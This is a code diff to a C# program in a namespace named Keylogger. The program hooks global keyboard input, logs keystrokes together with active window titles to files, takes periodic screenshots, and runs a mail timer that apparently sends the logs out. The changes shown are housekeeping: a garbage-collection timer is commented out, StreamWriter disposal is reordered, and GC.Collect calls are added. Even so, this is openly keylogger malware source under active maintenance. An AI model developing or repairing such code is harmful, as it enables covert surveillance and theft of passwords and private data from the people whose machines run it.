@@ -41,7 +41,7 @@ namespace Keylogger
 
         DispatcherTimer timerScreen = new DispatcherTimer();
         DispatcherTimer timerMail = new DispatcherTimer();
-        DispatcherTimer timerGarbage = new DispatcherTimer();
+       // DispatcherTimer timerGarbage = new DispatcherTimer();
 
         globalKeyboardHook gkh = new globalKeyboardHook();
         private readonly Mutex m = new Mutex();
@@ -82,9 +82,9 @@ namespace Keylogger
 
             txtNumScreen.Text = _numValueScreen.ToString();
 
-            timerGarbage.Tick += new EventHandler(timerGarbage_tick);
-            timerGarbage.Interval = new TimeSpan(0, 0, 1);
-            timerGarbage.Start();
+            //timerGarbage.Tick += new EventHandler(timerGarbage_tick);
+            //timerGarbage.Interval = new TimeSpan(0, 0, 1);
+            //timerGarbage.Start();
 
             timerScreen.Tick += new EventHandler(timerScreen_tick);
             timerScreen.Interval = new TimeSpan(0,0,1);
@@ -107,18 +107,18 @@ namespace Keylogger
 
         }
 
-        private int timeGarbage = 0;
-        private void timerGarbage_tick(object sender, EventArgs e)
-        {
-            timeGarbage++;
-            //labeltimescreen.Content = timeScreen.ToString();
-            if(10 == timeGarbage)
-            {
-                GC.Collect();
-                timeGarbage = 0;
-            }
+        //private int timeGarbage = 0;
+        //private void timerGarbage_tick(object sender, EventArgs e)
+        //{
+        //    timeGarbage++;
+        //    //labeltimescreen.Content = timeScreen.ToString();
+        //    if(10 == timeGarbage)
+        //    {
+        //        GC.Collect();
+        //        timeGarbage = 0;
+        //    }
             
-        }
+        //}
         
 
         private void CreateDir()
@@ -164,15 +164,16 @@ namespace Keylogger
                             catch (IOException) { }
                             finally
                             {
-                                SW.Dispose();
-                                SW.Close();
+                                SW?.Close();
+                                SW?.Dispose();
                             }
                         }
                         else
                         {
-                            SW.Write(" ");
-                            SW.Dispose();
-                            SW.Close();
+                            SW.Write(" ");                            
+                            SW?.Close();
+                            SW?.Dispose();
+                            
                         }
                     }
                 }
@@ -312,14 +313,13 @@ namespace Keylogger
                             SW.WriteLine();
                             SW.WriteLine(datatime + "\t" + winTitle);
                             SW.WriteLine();
-                            SW.Dispose();
+                            
 
 
                         }
                         if (nextline >= 100)
                         {
-                            SW.WriteLine("\t\t\t");
-                            SW.Dispose();
+                            SW.WriteLine("\t\t\t");                            
                             nextline = 0;
                         }
 
@@ -421,8 +421,8 @@ namespace Keylogger
                                     break;
                             }
                         }
-                        SW.Dispose();
-                        SW.Close();
+                        SW?.Close();
+                        SW?.Dispose();
                     }
                 }
                 finally
@@ -511,6 +511,7 @@ namespace Keylogger
                    // string str = "1";
                     StringBuilder str = new StringBuilder( DateTime.Now.ToString().Replace(':', '_'));
                     ScreenShot.ScreenSave(str);
+                    GC.Collect();
 
                 }
             }
@@ -702,6 +703,7 @@ namespace Keylogger
                         }
                         finally
                         {
+                            GC.Collect();
                             m.ReleaseMutex();//error
                             timeMail = 0;
                         }
